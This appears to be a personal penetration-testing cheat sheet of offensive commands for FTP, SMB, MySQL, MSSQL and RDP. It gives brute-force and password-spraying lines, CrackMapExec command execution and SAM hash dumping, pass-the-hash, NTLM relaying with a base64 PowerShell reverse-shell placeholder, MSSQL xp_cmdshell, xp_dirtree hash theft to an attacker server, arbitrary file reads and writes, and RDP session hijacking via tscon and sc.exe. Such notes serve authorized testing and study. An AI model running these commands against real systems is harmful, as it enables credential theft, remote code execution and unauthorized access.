Navigation: [[Pentesting]]

---
# Protocols
1. FTP
2. SMB
3. MySQL
4. MSSQL
5. RDP
6. DNS
7. SMTP
# FTP
### Enumeration
**Local Config**
```shell
cat /etc/vsftpd.conf | grep -v "#"

cat /etc/ftpusers
```
**Remote Enumeration**
```shell
nmap --script ftp-* -p 21 <ip>
```
### Brute Force
**Hydra**
```shell
hydra -l <user> -P <password_list> ftp://<host>
```
**Medusa**
```shell
medusa -u <user> -P <password_list> -h <host> -M ftp 
```
### Bounce Attack
In an FTP bounce attack, we're using a proxy FTP server to perform our attacks. This proxy is usually located in a DMZ. Here's a diagram from G4G:
![[ftp_bounce_attack.webp]]

**FTP Bounce using Nmap:**
```shell
nmap -Pn -v -n -p80 -b <user>:<pass>@<external_host> <internal_host>
```

Here's some further [reading](http://www.ouah.org/ftpbounce.html).
# SMB
### Enumeration
**Nmap Scan**
```shell
sudo nmap <Host> -sV -sC -p139,445
```

**Finding server shares:**
```shell
smbclient -N -L //<host>

smbmap -H <host> # Add -r <directory> to view directory
```

**Downloading and Uploading (If Allowed):**
```shell
smbmap -H <host> --download "notes\note.txt"

smbmap -H <host> --upload test.txt "notes\test.txt"
```

**RPC Client:**
Use the [SANS Cheatsheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to find commands to use after.
```shell
rpcclient -U'%' <host>

rpcclient -U "username%passwd" <IP> #With creds
```

**Enum4Linux**
[Source](https://github.com/cddmp/enum4linux-ng)
```shell-session
./enum4linux-ng.py <host> -A -C
```
### Brute Force
```shell
nmap --script smb-brute -p 445 <IP>

hydra -l Administrator -P words.txt <host> smb -t 1
```

### CrackMapExec
**Brute Force Users**
```shell
crackmapexec smb <host> -u /tmp/userlist.txt -p <'password'>
```

**Execute Command**
```shell
crackmapexec smb 10.10.110.17 -u <user> -p <'password'> -x <'cmd'> --exec-method smbexec
```

**Enumerate Logged on Users**
```shell
crackmapexec smb <IP>/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract SAM Hashes**
```shell
crackmapexec smb <host> -u administrator -p 'Password123!' --sam
```

**Pass-The-Hash**
```shell
crackmapexec smb <host> -u Administrator -H <hash>
```
### Responder
Tool used to poison `LLMNR`, `NBT-NS`, and `MDNS`. It can also set up fake services to steal `NetNTLM v1/v2` hashes.

**Setting up a Fake Server**
```shell
responder -I <interface name>
```
### Impacket
**Connect to Host**
Same options for `impacket-smbexec` and `impacket-atexec`
```shell
impacket-psexec <user>:<'password'> <host>
```

The next few commands are for use with `Responder`. Ensure the following:
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

**Extract SAM Hashes**
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host>
```

**Execute Reverse Shell**
[Create shell here](https://www.revshells.com/)
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host> -c 'powershell -e <base64 reverse shell>' # -c option allows us to use commands
```
# MySQL
[HackTricks Link][https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql]

**Nmap**
```shell
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse <host> -p 3306
```

**Connecting to the Server**
```shell
mysql -u <user> -p<password> -h <host>
```

**Default Databases**

| **Database**         | **Description**                                                                     |
| -------------------- | ----------------------------------------------------------------------------------- |
| `mysql`              | System database that contains tables to store required information                  |
| `information schema` | Metadata                                                                            |
| `performance schema` | Monitor low level execution                                                         |
| `sys`                | Set of objects to help DBAs and developers interpret data from `performance schema` |
**Writing Files**
First we'll need to check if we have [`secure_file_priv`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv):
1. If empty, variable has no effect
2. If set to name of a directory, imports and export operations only worth in that directory. The directory must also exist and is not created by the server
3. If `NULL`, import and export operations are disabled

```shell
# checking for perms
show variables like "secure_file_priv";

# this means the value isn't set
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

Here's how we can perform an arbitrary file write using [`SELECT INTO OUTFILE`](https://mariadb.com/kb/en/select-into-outfile/):
```shell
SELECT <file contents> INTO OUTFILE '<directory>'
```

**Reading Files**
Generally we don't have arbitrary read, but if the correct permissions are set, here's how we can do so:
```shell
select LOAD_FILE("<file_path>");
```

# MSSQL
**Connecting to the Server From Linux**
```shell
sqsh -S <host> -U <user> -P <pass> -h # last option disables headers and footers

mssqlclient.py -p <port> <user>@<IP> # requires impacket tool
```

**Specifying Local Accounts**
If we're using Windows authentication, we need to specify the domain name or host of the target machine. Otherwise, it'll assume SQL authentication and only look at users created in the SQL server. We can do this with two ways:
1. `SERVERNAME\accountname`
2. `.\\accountname`

**Default Databases**

| **Database** | **Description**                                                                                   |
| ------------ | ------------------------------------------------------------------------------------------------- |
| `master`     | Keeps information for the instance                                                                |
| `msdb`       | Used by server agent                                                                              |
| `model`      | Template database copied for every new database                                                   |
| `resource`   | Read-only database to keep system objects visible in every database on the server in `sys` schema |
| `tempdb`     | Keeps temporary objects used for queries                                                          |
**Command Execution**
`MSSQL` has something called `xp_cmdshell`, disabled by default, that allows for system command execution using SQL. Important things to keep in mind:
1. Enabled and disabled using policies or by executing `sp_configure`
2. Process spawned has same permissions as service account, process doesn't return control to user until command is complete

**Using Commands**
```sql
xp_cmdshell '<cmd>'
```

**Writing Local Files**
To write files, we need [`OLE Automation Procedures`](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) which requires admin privileges, then we can execute stored procedures to create a file. To enable permissions:
```shell
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

Then here's how to create a file:
```shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<file_path>', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<file_contents>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

**Reading Local Files**
By default, we can read any file that the service account has read access to:
```shell
SELECT * FROM OPENROWSET(BULK N'<file_path>', SINGLE_CLOB) AS Contents
```

**Stealing MSSQL Service Hash**
For this to work, we'll need to start `Responder` or `impacket-smbserver`. Then we can run any of these commands (with the IP being our fake server):
```shell
EXEC master..xp_dirtree '\\<IP>\share\'

EXEC master..xp_subdirs '\\<IP>\share\'
```

**User Impersonation**
MSSQL has a special permission called `IMPERSONATE` that allows us to take on the permissions of another user until the context is reset or session ends. By default, Sysadmins can impersonate anyone. 

Here's how we can find a list of users we can impersonate:
```shell
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

Checking if we're sysadmin:
```shell
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Impersonating a user:
```shell
EXECUTE AS LOGIN = '<user>'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

**Communicating with Other Databases**
In MSSQL, there's a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). They enable the database to execute a Transact-SQL statement that includes tables from another instance.

Identifying linked servers:
```shell
SELECT srvname, isremote FROM sysservers
```

Accessing a linked table:
```shell
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<server name>]
```
# RDP
**Nmap**
```shell
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

**Connecting to the Service**
```shell
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<NTLM hash> /v:<IP> #Pass the hash
```

Note for Pass the Hash, we'll need to enabled `Restricted Admin Mode` to allow admin logon through RDP:
```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Password Spraying**
```shell
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

# hydra
hydra -L usernames.txt -p 'password123' <IP> rdp
```

**Session Stealing**
With SYSTEM permissions, you can access any opened RDP session by any user without a password.

First, we'll need to get open sessions:
```shell
query user
```

Then to access the session:
```shell
tscon <ID> /dest:<SESSIONNAME>
```

We can also access the session using [`Microsoft sc.exe`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). We'll need to specify a service name and path for the binary to run (in this case, `session_hijack` and `cmd.exe` respectively):
```shell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"

net start sessionhijack
```

# DNS

# SMTP

---
Navigation: [[Pentesting]]